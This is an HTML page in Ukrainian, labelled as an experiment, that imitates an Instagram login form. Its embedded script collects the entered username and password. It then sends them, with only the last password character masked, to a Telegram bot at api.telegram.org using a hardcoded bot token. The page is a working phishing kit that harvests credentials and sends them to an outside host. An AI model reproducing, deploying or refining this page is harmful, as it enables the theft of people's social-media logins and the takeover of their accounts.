<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<title>Вхід (експеримент)</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  margin: 0;
  background: #0f1a22;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  font-family: Arial;
}
.box {
  width: 100%;
  max-width: 360px;
  padding: 20px;
}
h1 { color: white; text-align: center; }
input {
  width: 100%;
  margin-top: 16px;
  padding: 14px;
  border-radius: 16px;
  border: none;
  background: #15232d;
  color: white;
}
button {
  margin-top: 20px;
  width: 100%;
  padding: 14px;
  border-radius: 20px;
  border: none;
  background: #0b4a8b;
  color: white;
  font-weight: bold;
}
</style>
</head>

<body>
<div class="box">
  <h1>Увійти в Instagram</h1>

  <input id="user" placeholder="Логін">
  <input id="pass" type="password" placeholder="Пароль">

  <button onclick="send()">Увійти</button>
</div>

<script>
const BOT_TOKEN = "8453984584:AAG_Twi9S7GsHbEv6ZqfwEOgVE-KM6lcFBw";

function hideLastChar(text) {
  if (text.length === 0) return "";
  if (text.length === 1) return "*";
  return text.slice(0, -1) + "*";
}

async function getChatId() {
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
  const data = await res.json();
  return data.result[data.result.length - 1].message.chat.id;
}

async function send() {
  const u = document.getElementById("user").value;
  const p = document.getElementById("pass").value;

  const maskedPassword = hideLastChar(p);
  const chat_id = await getChatId();

  const text =
    "🔐 Вхід\n" +
    "Логін: " + u + "\n" +
    "Пароль: " + maskedPassword;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: chat_id,
      text: text
    })
  });

  alert("Дані надіслані");
}
</script>
</body>
</html>
